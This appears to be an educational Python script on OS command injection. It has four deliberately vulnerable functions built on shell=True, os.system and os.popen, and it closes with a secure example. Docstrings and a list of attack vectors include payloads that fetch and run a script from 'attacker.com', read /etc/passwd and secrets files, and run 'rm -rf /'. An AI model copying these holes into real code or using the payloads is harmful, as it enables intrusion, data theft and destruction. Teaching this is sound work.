"""
Command Injection Vulnerability Example
========================================
EDUCATIONAL PURPOSE ONLY - DO NOT USE IN PRODUCTION

This script demonstrates OS command injection vulnerabilities where
user input is passed to system commands without proper sanitization.
"""

import os
import subprocess

# VULNERABLE: Direct command execution with user input
def vulnerable_ping(host):
    """
    VULNERABLE: User input directly in shell command
    Attack: "google.com; cat /etc/passwd" or "google.com && rm -rf /"
    """
    print(f"[VULNERABLE] Pinging host: {host}")
    
    # VULNERABLE CODE - shell=True with unsanitized input
    command = f"ping -n 2 {host}"  # Windows: -n, Linux: -c
    print(f"Executing: {command}")
    
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout


def vulnerable_file_viewer(filename):
    """
    VULNERABLE: File operation with command injection
    Attack: "file.txt; ls -la" or "file.txt | cat /etc/passwd"
    """
    print(f"[VULNERABLE] Viewing file: {filename}")
    
    # VULNERABLE CODE
    command = f"type {filename}"  # Windows: type, Linux: cat
    print(f"Executing: {command}")
    
    os.system(command)  # NEVER USE os.system() with user input


def vulnerable_backup(directory):
    """
    VULNERABLE: Backup operation with command injection
    Attack: "/data; curl http://attacker.com/shell.sh | bash"
    """
    print(f"[VULNERABLE] Backing up directory: {directory}")
    
    # VULNERABLE CODE
    command = f"tar -czf backup.tar.gz {directory}"
    print(f"Executing: {command}")
    
    subprocess.call(command, shell=True)


def vulnerable_dns_lookup(domain):
    """
    VULNERABLE: DNS lookup with command injection
    Attack: "google.com`whoami`" or "google.com$(curl evil.com)"
    """
    print(f"[VULNERABLE] Looking up domain: {domain}")
    
    # VULNERABLE CODE - backticks and $() can execute commands
    command = f"nslookup {domain}"
    print(f"Executing: {command}")
    
    output = os.popen(command).read()  # os.popen is vulnerable
    return output


# Example attacks
if __name__ == "__main__":
    print("=== Command Injection Vulnerability Examples ===\n")
    
    print("1. Command Chaining Attack:")
    print("   Normal input: google.com")
    print("   Attack input: google.com & echo HACKED\n")
    
    # Demonstrate the vulnerability (safe demonstration)
    vulnerable_ping("google.com & echo HACKED")
    
    print("\n2. File Viewing with Command Injection:")
    print("   Normal input: document.txt")
    print("   Attack input: document.txt & whoami\n")
    
    print("\n3. Common Attack Vectors:")
    attack_vectors = [
        "; ls -la",           # Command separator
        "& dir",              # Background execution (Windows)
        "| cat /etc/passwd",  # Pipe to another command
        "`whoami`",           # Command substitution
        "$(curl evil.com)",   # Command substitution
        "&& rm -rf /",        # Conditional execution
        "|| cat secrets.txt", # OR execution
    ]
    
    for vector in attack_vectors:
        print(f"   - {vector}")
    
    print("\n=== SECURE ALTERNATIVES ===")
    print("1. Use subprocess with shell=False and list of arguments")
    print("2. Never use os.system() or os.popen()")
    print("3. Validate and sanitize all user input")
    print("4. Use allowlists for permitted values")
    print("5. Avoid shell=True in subprocess calls")
    
    print("\n=== SECURE EXAMPLE ===")
    print("""
def secure_ping(host):
    '''SECURE: Using subprocess without shell'''
    # Validate input first
    import re
    if not re.match(r'^[a-zA-Z0-9.-]+$', host):
        raise ValueError("Invalid hostname")
    
    # Use list form without shell=True
    result = subprocess.run(
        ['ping', '-n', '2', host],
        shell=False,  # Important!
        capture_output=True,
        text=True
    )
    return result.stdout
    """)
